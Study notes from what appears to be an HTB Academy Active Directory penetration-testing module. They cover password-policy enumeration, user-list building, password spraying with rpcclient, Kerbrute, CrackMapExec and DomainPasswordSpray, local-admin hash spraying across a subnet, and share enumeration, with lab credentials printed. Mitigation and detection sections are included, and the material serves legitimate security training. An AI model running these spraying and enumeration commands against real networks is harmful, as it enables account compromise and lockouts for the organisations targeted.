	> LDAP anonymous binds(https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.

	> With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as windapseach.py, ldapsearch, ad-ldapdomaindump.py, etc., to pull the password policy. With ldapsearch, it can be a bit cumbersome but doable. One example command to get the password policy is as follows:
	> Using ldapsearch
		m1l0js@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

* Enumerating the Password Policy - from Windows

	> If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as net.exe to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.

	> Using built-in commands is helpful if we land on a Windows system and cannot transfer tools to it, or we are positioned on a Windows system by the client, but have no way of getting tools onto it. One example using the built-in net.exe binary is:
	> Using net.exe
		C:\htb> net accounts
		Force user logoff how long after time expires?:       Never
		Minimum password age (days):                          1
		Maximum password age (days):                          Unlimited
		Minimum password length:                              8
		Length of password history maintained:                24
		Lockout threshold:                                    5
		Lockout duration (minutes):                           30
		Lockout observation window (minutes):                 30
		Computer role:                                        SERVER
		The command completed successfully.

		! Here we can glean the following information:
		    + Passwords never expire (Maximum password age set to Unlimited)
		    + The minimum password length is 8 so weak passwords are likely in use
		    + The lockout threshold is 5 wrong passwords
		    + Accounts remained locked out for 30 minutes

		! This password policy is excellent for password spraying. The eight-character minimum means that we can try common weak passwords such as Welcome1. The lockout threshold of 5 means that we can attempt 2-3 (to be safe) sprays every 31 minutes without the risk of locking out any accounts. If an account has been locked out, it will automatically unlock (without manual intervention from an admin) after 30 minutes, but we should avoid locking out ANY accounts at all costs.
	> Using powershell
		PS C:\> Get-ADDefaultDomainPasswordPolicy
		PS C:\> get-aduser -filter * -prop lastbadpasswordattempt,badpwdcount | select name,lastbadpasswordattempt,badpwdcount | format-table -auto //To see badpwcount

	> PowerView is also quite handy for this:
	> Using PowerView
		PS C:\htb> import-module .\PowerView.ps1
		PS C:\htb> Get-DomainPolicy

		Unicode        : @{Unicode=yes}
		SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
		                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
		                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
		                 LSAAnonymousNameLookup=0}
		KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
		Version        : @{signature="$CHICAGO$"; Revision=1}
		RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
		Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
		                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
		GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
		GPODisplayName : Default Domain Policy

		! PowerView gave us the same output as our net accounts command, just in a different format but also revealed that password complexity is enabled (PasswordComplexity=1).

* As with Linux, we have many tools at our disposal to retrieve the password policy while on a Windows system, whether it is our attack system or a system provided by the client. PowerView/SharpView are always good bets, as are CrackMapExec, SharpMapExec, and others. The choice of tools depends on the goal of the assessment, stealth considerations, any anti-virus or EDR in place, and other potential restrictions on the target host. Let's cover a few examples.
* Analyzing the Password Policy

	> We've now pulled the password policy in numerous ways. Let's go through the policy for the INLANEFREIGHT.LOCAL domain piece by piece.

    		- The minimum password length is 8 (8 is very common, but nowadays, we are seeing more and more organizations enforce a 10-14 character password, which can remove some password options for us, but does not mitigate the password spraying vector completely)
    		- The account lockout threshold is 5 (it is not uncommon to see a lower threshold such as 3 or even no lockout threshold set at all)
    		- The lockout duration is 30 minutes (this may be higher or lower depending on the organization), so if we do accidentally lockout (avoid!!) an account, it will unlock after the 30-minute window passes
    		- Accounts unlock automatically (in some organizations, an admin must manually unlock the account). We never want to lockout accounts while performing password spraying, but we especially want to avoid locking out accounts in an organization where an admin would have to intervene and unlock hundreds (or thousands) of accounts by hand/script
    		- Password complexity is enabled, meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character (Password1 or Welcome1 would satisfy the "complexity" requirement here, but are still clearly weak passwords).

* The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:
	Policy 	Default Value
	Enforce password history 	24 days
	Maximum password age 	42 days
	Minimum password age 	1 day
	Minimum password length 	7
	Password must meet complexity requirements 	Enabled
	Store passwords using reversible encryption 	Disabled
	Account lockout duration 	Not set
	Account lockout threshold 	0
	Reset account lockout counter after 	Not set

* Next Steps
	> Now that we have the password policy in hand, we need to create a target user list to perform our password spraying attack. Remember that sometimes we will not be able to obtain the password policy if we are performing external password spraying (or if we are on an internal assessment and cannot retrieve the policy using any of the methods shown here). In these cases, we MUST exercise extreme caution not to lock out accounts. We can always ask our client for their password policy if the goal is as comprehensive an assessment as possible. If asking for the policy does not fit the expectations of the assessment or the client does not want to provide it, we should run one, max two, password spraying attempts (regardless of whether we are internal or external) and wait over an hour between attempts if we indeed decide to attempt two. While most organizations will have a lockout threshold of 5 bad password attempts, a lockout duration of 30 minutes and accounts will automatically unlock, we cannot always count on this being normal. I have seen plenty of organizations with a lockout threshold of 3, requiring an admin to intervene and unlock accounts manually.
	> Let's now prepare to launch our password spraying attacks by gathering a list of target users.

[+] Password Spraying - Making a Target User List
* Detailed User Enumeration
* To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with. There are several ways that we can gather a target list of valid users:
    - By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
    - Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
    - Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the stastically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users
    - Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist

	> No matter the method we choose, it is also vital for us to consider the domain password policy. If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy. Having this policy in hand is very useful because the minimum password length and whether or not password complexity is enabled can help us formulate the list of passwords we will try in our spray attempts. Knowing the account lockout threshold and bad password timer will tell us how many spray attempts we can do at a time without locking out any accounts and how many minutes we should wait between spray attempts.
	> Again, if we do not know the password policy, we can always ask our client, and, if they won't provide it, we can either try one very targeted password spraying attempt as a "hail mary" if all other options for a foothold have been exhausted. We could also try one spray every few hours in an attempt to not lock out any accounts. Regardless of the method we choose, and if we have the password policy or not, we must always keep a log of our activities, including, but not limited to:
    		- The accounts targeted
    		- Domain Controller used in the attack
    		- Time of the spray
    		- Date of the spray
    		- Password(s) attempted

		! This will help us ensure that we do not duplicate efforts. If an account lockout occurs or our client notices suspicious logon attempts, we can supply them with our notes to crosscheck against their logging systems and ensure nothing nefarious was going on in the network.

* SMB NULL Session to Pull User List
	> If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or SYSTEM access on a Windows host, then you can easily query Active Directory for this information.
	> It’s possible to do this using the SYSTEM account because it can impersonate the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). If you don’t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to Active Directory.
	> Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with enum4linux with the -U flag.
	> Using enum4linux
		m1l0js@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
		m1l0js@htb[/htb]$ cat users.txt | awk '{print $1}' | grep -Po '\[\K[^]]*' //Another way of to this with enum4linux -U before
		cat users.txt | awk '{print $1}' | grep -Po '\[\K[^]]*'
	> We can use the enumdomusers command after connecting anonymously using rpcclient.
	> Using rpcclient
		m1l0js@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
		rpcclient $> enumdomusers 


	> Finally, we can use CrackMapExec with the --users flag. This is a useful tool that will also show the badpwdcount (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the baddpwdtime, which is the date and time of the last bad password attempt, so we can see how close an account is to having its badpwdcount reset. In an environment with multiple Domain Controllers, this value is maintained separately on each one. To get an accurate total of the account's bad password attempts, we would have to either query each Domain Controller and use the sum of the values or query the Domain Controller with the PDC Emulator FSMO role.
	> Using CrackMapExec --users Flag
		m1l0js@htb[/htb]$ crackmapexec smb 172.16.5.5 --users

* Gathering Users with LDAP Anonymous
	> We can use various tools to gather users when we find an LDAP anonymous bind. Some examples include windapsearch and ldapsearch. If we choose to use ldapsearch we will need to specify a valid LDAP search filter. We can learn more about these search filters in the Active Directory LDAP module.
	> Using ldapsearch
		m1l0js@htb[/htb]$ ldapsearch -H 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

	> Tools such as windapsearch make this easier (though we should still understand how to create our own LDAP search filters). Here we can specify anonymous access by providing a blank username with the -u flag and the -U flag to tell the tool to retrieve just users.
	> Using windapsearch
		m1l0js@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

	> Enumerating Users with Kerbrute

		- As mentioned in the Initial Enumeration of The Domain section, if we have no access at all from our position in the internal network, we can use Kerbrute to enumerate valid AD accounts and for password spraying.
		- This tool uses Kerberos Pre-Authentication, which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for. The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error PRINCIPAL UNKNOWN, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid. This method of username enumeration does not cause logon failures and will not lock out accounts. However, once we have a list of valid users and switch gears to use this tool for password spraying, failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout, so we still must be careful regardless of the method chosen.
		- Let's try out this method using the jsmith.txt wordlist of 48,705 possible common usernames in the format flast. The statistically-likely-usernames GitHub repo is an excellent resource for this type of attack and contains a variety of different username lists that we can use to enumerate valid usernames using Kerbrute.
		- Kerbrute User Enumeration
			m1l0js@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
			! We've checked over 48,000 usernames in just over 12 seconds and discovered 50+ valid ones. Using Kerbrute for username enumeration will generate event ID 4768: A Kerberos authentication ticket (TGT) was requested. This will only be triggered if Kerberos event logging is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack. If we are successful with this method during a penetration test, this can be an excellent recommendation to add to our report.
	> If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as linkedin2username to mash up possible usernames from a company's LinkedIn page.

* Credentialed Enumeration to Build our User List
	> With valid credentials, we can use any of the tools stated previously to build a user list. A quick and easy way is using CrackMapExec.
	> Using CrackMapExec with Valid Credentials
		m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

-=-=
[+] Internal Password Spraying - from Linux
* Now that we have created a wordlist using one of the methods outlined in the previous sections, it’s time to execute our attack. The following sections will let us practice Password Spraying from Linux and Windows hosts. This is a key focus for us as it is one of two main avenues for gaining domain credentials for access, but one that we also must proceed with cautiously.
* Internal Password Spraying from a Linux Host
	> Once we’ve created a wordlist using one of the methods shown in the previous section, it’s time to execute the attack. Rpcclient is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response. The following Bash one-liner (adapted from here) can be used to perform the attack.
	> Using a Bash one-liner for the Attack
		for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

	> Let's try this out against the target environment.
	> Using a Bash one-liner for the Attack
		m1l0js@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

	> We can also use Kerbrute for the same attack as discussed previously.
	> Using Kerbrute for the Attack
		m1l0js@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

	> There are multiple other methods for performing password spraying from Linux. Another great option is using CrackMapExec. The ever-versatile tool accepts a text file of usernames to be run against a single password in a spraying attack. Here we grep for + to filter out logon failures and hone in on only valid login attempts to ensure we don't miss anything by scrolling through many lines of output.
	> Using CrackMapExec & Filtering Logon Failures
		m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

	> After getting one (or more!) hits with our password spraying attack, we can then use CrackMapExec to validate the credentials quickly against a Domain Controller.
	> Validating the Credentials with CrackMapExec
		m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

Local Administrator Password Reuse

	> Internal password spraying is not only possible with domain user accounts. If you obtain administrative access and the NTLM password hash or cleartext password for the local administrator account (or another privileged local account), this can be attempted across multiple hosts in the network. Local administrator account password reuse is widespread due to the use of gold images in automated deployments and the perceived ease of management by enforcing the same password across multiple hosts.
	> CrackMapExec is a handy tool for attempting this attack. It is worth targeting high-value hosts such as SQL or Microsoft Exchange servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.
	> When working with local administrator accounts, one consideration is password re-use or common password formats across accounts. If we find a desktop host with the local administrator account password set to something unique such as $desktop%@admin123, it might be worth attempting $server%@admin123 against servers. Also, if we find non-standard local administrator accounts such as bsmith, we may find that the password is reused for a similarly named domain user account. The same principle may apply to domain accounts. If we retrieve the password for a user named ajones, it is worth trying the same password on their admin account (if the user has one), for example, ajones_adm, to see if they are reusing their passwords. This is also common in domain trust situations. We may obtain valid credentials for a user in domain A that are valid for a user with the same or similar username in domain B or vice-versa.
	> Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set. In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain. By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.
	> Local Admin Spraying with CrackMapExec
		m1l0js@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

	> This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth. It is always worth looking for this issue during penetration tests, even if it is not part of our path to compromise the domain, as it is a common issue and should be highlighted for our clients. One way to remediate this issue is using the free Microsoft tool Local Administrator Password Solution (LAPS ==> https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.


[+] Internal Password Spraying - from Windows

	> From a foothold on a domain-joined Windows host, the DomainPasswordSpray(https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. Like how we ran the spraying attack from our Linux host, we can also supply a user list to the tool if we are on a Windows host but not authenticated to the domain. We may run into a situation where the client wants us to perform testing from a managed Windows device in their network that we can load tools onto. We may be physically on-site in their offices and wish to test from a Windows VM, or we may gain an initial foothold through some other attack, authenticate to a host in the domain and perform password spraying in an attempt to obtain credentials for an account that has more rights in the domain.
	> There are several options available to us with the tool. Since the host is domain-joined, we will skip the -UserList flag and let the tool generate a list for us. We'll supply the Password flag and one single password and then use the -OutFile flag to write our output to a file for later use.
	> Using DomainPasswordSpray.ps1
		PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
		PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

* Mitigations

	> Several steps can be taken to mitigate the risk of password spraying attacks. While no single solution will entirely prevent the attack, a defense-in-depth approach will render password spraying attacks extremely difficult.
	> Technique 	Description
	Multi-factor Authentication 	Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals.
	Restricting Access 	It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it.
	Reducing Impact of Successful Exploitation 	A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.
	Password Hygiene 	Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts.

* Other Considerations
	> It is vital to ensure that your domain password lockout policy doesn’t increase the risk of denial of service attacks. If it is very restrictive and requires an administrative intervention to unlock accounts manually, a careless password spray may lock out many accounts within a short period.

* Detection
	> Some indicators of external password spraying attacks include many account lockouts in a short period, server or application logs showing many login attempts with valid or non-existent users, or many requests in a short period to a specific application or URL.
	> In the Domain Controller’s security log, many instances of event ID 4625: An account failed to log on over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID 4771: Kerberos pre-authentication failed, which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This post(https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.
		PS C:\> get-aduser -filter * -prop lastbadpasswordattempt,badpwdcount | select name,lastbadpasswordattempt,badpwdcount | format-table -auto
	> With these mitigations finely tuned and with logging enabled, an organization will be well-positioned to detect and defend against internal and external password spraying attacks.

* External Password Spraying
	> While outside the scope of this module, password spraying is also a common way that attackers use to attempt to gain a foothold on the internet. We have been very successful with this method during penetration tests to gain access to sensitive data through email inboxes or web applications such as externally facing intranet sites. Some common targets include:
    		+ Microsoft 0365
    		+ Outlook Web Exchange
    		+ Exchange Web Access
    		+ Skype for Business
    		+ Lync Server
    		+ Microsoft Remote Desktop Services (RDS) Portals
    		+ Citrix portals using AD authentication
    		+ VDI implementations using AD authentication such as VMware Horizon
    		+ VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
    		+ Custom web applications that use AD authentication

* Moving Deeper
	> Now that we have several sets of valid credentials, we can begin digging deeper into the domain by performing credentialed enumeration with various tools. We will walk through several tools that complement each other to give us the most complete and accurate picture of a domain environment. With this information, we will seek to move laterally and vertically in the domain to eventually reach the end goal of our assessment.

[+] Enumerating Security Controls

	> After gaining a foothold, we could use this access to get a feeling for the defensive state of the hosts, enumerate the domain further now that our visibility is not as restricted, and, if necessary, work at "living off the land" by using tools that exist natively on the hosts. It is important to understand the security controls in place in an organization as the products in use can affect the tools we use for our AD enumeration, as well as exploitation and post-exploitation. Understanding the protections we may be up against will help inform our decisions regarding tool usage and assist us in planning our course of action by either avoiding or modifying certain tools. Some organizations have more stringent protections than others, and some do not apply security controls equally throughout. There may be policies applied to certain machines that can make our enumeration more difficult that are not applied on other machines.
	> Note: This section is intended to showcase possible security controls in place within a domain, but does not have an interactive component. Enumerating and bypassing security controls are outside the scope of this module, but we wanted to give an overview of the possible technologies we may encounter during an assessment.
* Windows Defender
	> Windows Defender (or Microsoft Defender after the Windows 10 May 2020 Update) has greatly improved over the years and, by default, will block tools such as PowerView. There are ways to bypass these protections. These ways will be covered in other modules. We can use the built-in PowerShell cmdlet Get-MpComputerStatus to get the current Defender status. Here, we can see that the RealTimeProtectionEnabled parameter is set to True, which means Defender is enabled on the system.
	> Checking the Status of Defender with Get-MpComputerStatus
		PS C:\htb> Get-MpComputerStatus

* AppLocker

	> An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization. AppLocker is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run. It provides granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers. It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other PowerShell executable locations(https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations.php) such as %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe or PowerShell_ISE.exe. We can see that this is the case in the AppLocker rules shown below. All Domain Users are disallowed from running the 64-bit PowerShell executable located at:

		%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe

	> So, we can merely call it from other locations. Sometimes, we run into more stringent AppLocker policies that require more creativity to bypass. These ways will be covered in other modules.
	> Using Get-AppLockerPolicy cmdlet
		PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

* PowerShell Constrained Language Mode
	> PowerShell Constrained Language Mode locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.
	> Enumerating Language Mode
		PS C:\htb> $ExecutionContext.SessionState.LanguageMode
		ConstrainedLanguage

* LAPS
	> The Microsoft Local Administrator Password Solution (LAPS) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed. The LAPSToolkit(https://github.com/leoloobeek/LAPSToolkit) greatly facilitates this with several functions. One is parsing ExtendedRights for all computers with LAPS enabled. This will show groups specifically delegated to read LAPS passwords, which are often users in protected groups. An account that has joined a computer to a domain receives All Extended Rights over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.
	> Using Find-LAPSDelegatedGroups
		PS C:\htb> Find-LAPSDelegatedGroups

	> The Find-AdmPwdExtendedRights checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.
	> Using Find-AdmPwdExtendedRights
		PS C:\htb> Find-AdmPwdExtendedRights

	> We can use the Get-LAPSComputers function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.
	> Using Get-LAPSComputers
		PS C:\htb> Get-LAPSComputers

[+] Credentialed Enumeration - from Linux

* Now that we have acquired a foothold in the domain, it is time to dig deeper using our low privilege domain user credentials. Since we have a general idea about the domain's userbase and machines, it's time to enumerate the domain in depth. We are interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more. We have various options available, but the most important thing to remember is that most of these tools will not work without valid domain user credentials at any permission level. So at a minimum, we will have to have acquired a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host.
* To follow along, spawn the target at the bottom of this section and SSH to the Linux attack host as the htb-student user. For enumeration of the INLANEFREIGHT.LOCAL domain using the tools installed on the ATTACK01 Parrot Linux host, we will use the following credentials: User=forend and password=Klmcargo2. Once our access is established, it's time to get to work. We'll start with CrackMapExec.

* CrackMapExec

	> CrackMapExec (CME) is a powerful toolset to help with assessing AD environments. It utilizes packages from the Impacket and PowerSploit toolkits to perform its functions. For detailed explanations on using the tool and accompanying modules, see the wiki. Don't be afraid to use the -h flag to review the available options and syntax.
	> We can see that we can use the tool with MSSQL, SMB, SSH, and WinRM credentials. Let's look at our options for CME with the SMB protocol:
	> CME offers a help menu for each protocol (i.e., crackmapexec winrm -h, etc.). Be sure to review the entire help menu and all possible options. For now, the flags we are interested in are:
    		-u Username The user whose credentials we will use to authenticate
    		-p Password User's password
    		Target (IP or FQDN) Target host to enumerate (in our case, the Domain Controller)
    		--users Specifies to enumerate Domain Users
    		--groups Specifies to enumerate domain groups
    		--loggedon-users Attempts to enumerate what users are logged on to a target, if any

	> We'll start by using the SMB protocol to enumerate users and groups. We will target the Domain Controller (whose address we uncovered earlier) because it holds all data in the domain database that we are interested in. Make sure you preface all commands with sudo.
	+ CME - Domain User Enumeration
		> We start by pointing CME at the Domain Controller and using the credentials for the forend user to retrieve a list of all domain users. Notice when it provides us the user information, it includes data points such as the badPwdCount attribute. This is helpful when performing actions like targeted password spraying. We could build a target user list filtering out any users with their badPwdCount attribute above 0 to be extra careful not to lock any accounts out.
		> CME - Domain User Enumeration
			m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
	+ CME - Domain Group Enumeration
		m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

		! The above snippet lists the groups within the domain and the number of users in each. The output also shows the built-in groups on the Domain Controller, such as Backup Operators. We can begin to note down groups of interest. Take note of key groups like Administrators, Domain Admins, Executives, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting during our assessment.

	+ CME - Logged On Users
		> We can also use CME to target other hosts. Let's check out what appears to be a file server to see what users are logged in currently.
		> CME - Logged On Users
			m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

	> We see that many users are logged into this server which is very interesting. We can also see that our user forend is a local admin because (Pwn3d!) appears after the tool successfully authenticates to the target host. A host like this may be used as a jump host or similar by administrative users. We can see that the user wley is logged in, who we earlier identified as a domain admin. It could be an easy win if we can steal this user's credentials from memory or impersonate them.
	> As we will see later, BloodHound (and other tools such as PowerView) can be used to hunt for user sessions. BloodHound is particularly powerful as we can use it to view Domain User sessions graphically and quickly in many ways. Regardless, tools such as CME are great for more targeted enumeration and user hunting.

	+ CME Share Searching
		> We can use the --shares flag to enumerate available shares on the remote host and the level of access our user account has to each share (READ or WRITE access). Let's run this against the INLANEFREIGHT.LOCAL Domain Controller.
		> Share Enumeration - Domain Controller
			m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

		> We see several shares available to us with READ access. The Department Shares, User Shares, and ZZZ_archive shares would be worth digging into further as they may contain sensitive data such as passwords or PII. Next, we can dig into the shares and spider each directory looking for files. The module spider_plus will dig through each readable share on the host and list all readable files. Let's give it a try.
		> Spider_plus
			m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
		> In the above command, we ran the spider against the Department Shares. When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/<ip of host>. Below we can see a portion of the JSON output. We could dig around for interesting files such as web.config files or scripts that may contain passwords. If we wanted to dig further, we could pull those files to see what all resides within, perhaps finding some hardcoded credentials or other sensitive information.

* SMBMap
	> SMBMap is great for enumerating SMB shares from a Linux attack host. It can be used to gather a listing of shares, permissions, and share contents if accessible. Once access is obtained, it can be used to download and upload files and execute remote commands.
	> Like CME, we can use SMBMap and a set of domain user credentials to check for accessible shares on remote systems. As with other tools, we can type the command smbmap -h to view the tool usage menu. Aside from listing shares, we can use SMBMap to recursively list directories, list the contents of a directory, search file contents, and more. This can be especially useful when pillaging shares for useful information.
	> SMBMap To Check Access
		m1l0js@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

	> The above will tell us what our user can access and their permission levels. Like our results from CME, we see that the user forend has no access to the DC via the ADMIN$ or C$ shares (this is expected for a standard user account), but does have read access over IPC$, NETLOGON, and SYSVOL which is the default in any domain. The other non-standard shares, such as Department Shares and the user and archive shares, are most interesting. Let's do a recursive listing of the directories in the Department Shares share. We can see, as expected, subdirectories for each department in the company.
	> Recursive List Of All Directories
		m1l0js@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
	> As the recursive listing dives deeper, it will show you the output of all subdirectories within the higher-level directories. The use of --dir-only provided only the output of all directories and did not list all files. Try this against other shares on the Domain Controller and see what you can find.

* rpcclient

	> rpcclient is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD. It is highly versatile; we just have to find the correct command to issue for what we want to accomplish. The man page for rpcclient is very helpful for this; just type man rpcclient into your attack host's shell and review the options available. Let's cover a few rpcclient functions that can be helpful during a penetration test.
